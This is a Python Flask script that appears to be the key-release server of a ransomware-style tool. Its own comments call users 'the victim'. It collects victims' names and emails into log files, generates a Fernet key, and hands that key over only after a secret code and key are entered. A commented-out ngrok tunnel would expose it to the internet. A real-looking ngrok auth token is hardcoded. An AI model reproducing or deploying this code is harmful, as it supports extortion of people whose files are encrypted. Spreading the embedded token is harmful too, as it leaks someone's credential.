#!/usr/bin/env python3

from pyngrok import ngrok
import logging
import os
import string
import re
from time import sleep
import json
import secrets
import platform
import threading
from cryptography.fernet import Fernet
import random
from flask import Flask, request, render_template, url_for, session, redirect, abort, make_response

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

ngrok_auth_token = '1y5lTl64MsClFBVxUKcZblJDLtq_5N6dVT9Y8XeeXfpifFbgs'
ngrok.set_auth_token(ngrok_auth_token)

path = 'logs'
if not os.path.exists(path):
    os.mkdir(path)

else:
    path = path

username = os.getlogin()
ops = platform.uname()[0]
current_dirs = os.getcwd()

info = {
    'Username': username,
    'Operating System': ops,
    'Current Directory': current_dirs
}

data = json.dumps(info, indent=4)
with open(path + f'/{username}.json', 'w') as f:
    f.write(data)
    f.close()

fernet_key = Fernet.generate_key()

os.environ['FLASK_ENV'] = 'development'
app = Flask(__name__)
app.debug = False
app.config['SECRET_KEY'] = secrets.token_hex()
fport = 5000

strings = string.ascii_uppercase + string.ascii_lowercase + string.digits
lengt = 12

user = input('What\'s your name? ')
print(f'Hi {user}')
print('Starting...\n')
secret_code = "".join(random.sample(strings, lengt))
secret_key = secrets.token_hex()
print(' * {}'.format(fernet_key))
print(' * Secret Code: {}'.format(secret_code))
print(' * Secret Key: {}'.format(secret_key))

data1 = {
    'secret_code': secret_code,
    'secret_key': secret_key
}

with open(path + '/xorg.txt', 'w') as f:
    f.write(f'Secret Code: {secret_code}\n')
    f.write(f'Secret Key: {secret_key}')
    f.close()

#public_url = ngrok.connect(fport, auth=f'xorg:{secret_code}').public_url
#print(' * ngrok tunnel \"{}\" -> \"http://127.0.0.1:{}\"'.format(public_url, fport))
#app.config['BASE_URL'] = public_url

@app.route('/')
def index():

    return render_template('index.html')

@app.route('/info', methods=['POST', 'GET'])  # Get information from the victim
def info():
    error = None
    if request.method == 'POST':
        users = request.form['name']
        email = request.form['email']

        _info = {
            'Name': users,
            'Email': email
        }

        data2 = json.dumps(_info, indent=4)
        with open(path + f'/{email}.json', 'w') as f1:
            f1.write(data2)
            f1.close()

        if not users or not email:
            error = 'Please fill out the form !'

        elif not re.match(r'[A-Za-z0-9]+', users):
            error = 'Username must contain only characters and numbers !'

        elif not re.match(r'[^@]+@[^@]+\.[^@]+', email):
            error = 'Invalid email address!'

        else:
            session['success'] = True
            session['email'] = email
            session['name'] = users
            return redirect(url_for('xorg'))

    elif request.method == 'POST':
        error = 'Please fill out the form !'
    return render_template('info.html', error=error)

@app.route('/xorg', methods=['POST', 'GET'])
def xorg():
    error = None
    if request.method == 'POST':
        code = request.form['code']
        key = request.form['key']
        if code == data1['secret_code'] and key == data1['secret_key']:
            session['success'] = True
            session['code'] = code
            return make_response(redirect(url_for('xorgs')))

        elif not session.get('name'):
            return render_template('401.html'), 401

        elif not code or not key:
            error = 'Please fill out the form !'

        else:
            error = 'Invalid code/secret key. Please try again.'

    elif request.method == 'POST':
        error = 'Please fill out the form!'

    return render_template('xorg.html', error=error)

@app.route('/xorgs')
def xorgs():
    msg = ''
    if not session.get('code'):
        return render_template('401.html'), 401

    else:
        msg = f'Secret Key: {fernet_key.decode("utf-8")}'

    return render_template('xorgs.html', msg=msg)

threading.Thread(target=app.run, kwargs={'use_reloader': False}).start()
